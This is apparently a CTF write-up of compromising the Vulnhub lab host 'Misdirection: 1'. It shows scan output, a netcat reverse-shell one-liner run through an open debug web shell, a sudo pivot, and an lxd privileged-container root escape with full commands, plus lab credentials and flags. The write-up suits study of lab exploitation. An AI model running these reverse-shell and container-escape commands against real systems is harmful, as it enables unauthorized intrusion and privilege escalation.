---
title: Cybersecurity
date: 2023-02-24 06:45:00 +/-500
categories: [Cybersecurity, CTF Challenges]
tags: [linux, ctf]     # TAG names should always be lowercase
---


# Misdirection: 1

In this post, we will examine the procedures I employed to fully compromise the "Misdirection: 1" host from Vulnhub.
# Nmap Results

```terminal
# Nmap 7.92 scan initiated Wed Jun 15 23:47:44 2022 as: nmap -T5 -p22,80,3306,8080 -A -oA scan-all 10.9.9.47
Nmap scan report for misdirection.cyber.range (10.9.9.47)
Host is up (0.00048s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|firewall
Running (JUST GUESSING): Linux 4.X|3.X|2.6.X|5.X (97%), Synology DiskStation Manager 5.X (88%), WatchGuard Fireware 11.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:3.13 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:5.1 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:linux:linux_kernel cpe:/o:watchguard:fireware:11.8
Aggressive OS guesses: Linux 4.4 (97%), Linux 3.13 (96%), Linux 2.6.32 (95%), Linux 4.0 (95%), Linux 3.10 - 4.11 (93%), Linux 3.11 - 4.1 (93%), Linux 3.2 - 4.9 (93%), Linux 5.1 (93%), Linux 2.6.32 or 3.10 (93%), Linux 3.10 - 3.12 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
1   0.24 ms pfSense.cyber.range (10.0.0.1)
2   0.37 ms misdirection.cyber.range (10.9.9.47)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 15 23:48:03 2022 -- 1 IP address (1 host up) scanned in 19.21 seconds
```

# Service Enumeration

## TCP/80

![](../../assets/img/vulnhub/mis1.png)

```gobuster
dir -u http://misdirection.cyber.range -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html -o gobuster-out.txt -b 400,404
-b 400,404 to remove false-positives
```

```yml
/admin                (Status: 200) [Size: 42]
/examples             (Status: 200) [Size: 6937]
/init                 (Status: 200) [Size: 5782]
/server-status        (Status: 403) [Size: 312]
/welcome              (Status: 200) [Size: 13705]
```

# TCP/8080

![](../../assets/img/vulnhub/mis2.png)


`gobuster dir -u http://misdirection.cyber.range:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html -o gobuster-out.txt`

```yml
/.htaccess.php        (Status: 403) [Size: 314]
/.htpasswd            (Status: 403) [Size: 310]
/.htaccess.html       (Status: 403) [Size: 315]
/.htpasswd.php        (Status: 403) [Size: 314]
/.htaccess            (Status: 403) [Size: 310]
/.htpasswd.html       (Status: 403) [Size: 315]
/css                  (Status: 301) [Size: 341] [--> http://misdirection.cyber.range:8080/css/]
/debug                (Status: 301) [Size: 343] [--> http://misdirection.cyber.range:8080/debug/]
/development          (Status: 301) [Size: 349] [--> http://misdirection.cyber.range:8080/development/]
/help                 (Status: 301) [Size: 342] [--> http://misdirection.cyber.range:8080/help/]
/images               (Status: 301) [Size: 344] [--> http://misdirection.cyber.range:8080/images/]
/index.html           (Status: 200) [Size: 10918]
/js                   (Status: 301) [Size: 340] [--> http://misdirection.cyber.range:8080/js/]
/manual               (Status: 301) [Size: 344] [--> http://misdirection.cyber.range:8080/manual/]
/scripts              (Status: 301) [Size: 345] [--> http://misdirection.cyber.range:8080/scripts/]
/server-status        (Status: 403) [Size: 314]
/shell                (Status: 301) [Size: 343] [--> http://misdirection.cyber.range:8080/shell/]
/wordpress            (Status: 301) [Size: 347] [--> http://misdirection.cyber.range:8080/wordpress/]
```

![](../../assets/img/vulnhub/mis3.png)


Using a netcat listener and netcat on the system, we can acquire a reverse shell on the /debug page.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.2 443 >/tmp/f`

# Exploit

A globally open debug shell on the web server permits an attacker to execute commands on the host without authentication.

![](../../assets/img/vulnhub/mis4.png)

![](../../assets/img/vulnhub/mis5.png)

# Post-Exploit Enumeration

## Current User

```uid=33(www-data) 
gid=33(www-data) groups=33(www-data)

Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```


# OS & Kernel

```yml
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.2 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
    
Linux misdirection 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```


# Users

```plaintext
brexit:x:1000:1000:brexit:/home/brexit:/bin/bash
```

# Groups

```plaintext
brexit:x:1000:
```



# Network

## Interfaces

```terminal
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: ens18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
    link/ether 0e:89:fa:6a:08:b5 brd ff:ff:ff:ff:ff:ff
```

## Open Ports

```tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

# Processes

```brexit     538  0.0  0.0   4628   772 ?        Ss   Jul19   0:00 /bin/sh -c /home/brexit/start-vote.sh
brexit     546  0.0  0.1  11592  3180 ?        S    Jul19   0:00 /bin/bash /home/brexit/start-vote.sh
brexit     563  0.1  1.9 711916 40140 ?        Sl   Jul19   0:01 python /home/brexit/web2py/web2py.py -a <recycle>
```

# Interesting Files

/var/www/html/wordpress/wp-config.php

```yml
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wp_myblog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', 'abcdefghijklmnopqrstuv' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

# Privilege Escalation

## Lateral Pivot

The user www-user has the privilege to run /bin/bash as the brexit user without a password through sudo. After pivoting to the brexit user, I used the ID command to check for any specific group memberships.

![](../../assets/img/vulnhub/mis6.png)

# Key Differences

This system does not come with any preinstalled images available. As a result, we cannot utilize the sudo command to run lxd-alpine-builder as shown in the HackTricks guide. Instead, we will need to manually download a pre-built image and import it. Additionally, this system is located behind our firewall and lacks internet access."

# Root Privilege Escalation

## Download the Linux Container Image on Kali

We opt to choose the Alpine Linux image for our Linux container image build, which can be accessed via the following link: https://us.lxd.images.canonical.com/images.

On Kali, we proceed to download the image files:

```bash
wget --no-parent -r https://us.lxd.images.canonical.com/images/alpine/3.15/amd64/default/20220720_13:00/
cd us.lxd.images.canonical.com/images/alpine/3.15/amd64/default/20220720_13:00/
find . -name '*html*' -delete
tar -cvf alpine.tar ./*
```

## Transfer to the Target

Initiate a web server to transfer the image to the target

```bash
sudo python3 -m http.server 80
```

On the target, we download the alpine.tar file from Kali and extract it

```bash
wget http://kali.cyber.range/alpine.tar
mkdir alpine
tar -xvf alpine.tar -C alpine
cd alpine
```

## Import the Container Image Manually

```console
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
lxd init
lxc init alpine alpinect -c security.privileged=true
lxc config device add alpinect pwndisk disk source=/ path=/mnt/root recursive=true
lxc start alpinect
lxc exec alpinect /bin/sh
```

Note that while running lxd init, the default options can be used by simply pressing the Enter key multiple times. Additionally, it should be noted that the host's disk is mounted at /mnt/root.

![](../../assets/img/vulnhub/mis7.png)

# Flags

Brexit

```plaintext
404b9193154be7fbbc56d7534cb26339
```


Root

```plaintext0d2c6222bfdd3701e0fa12a9a9dc9c8c
```

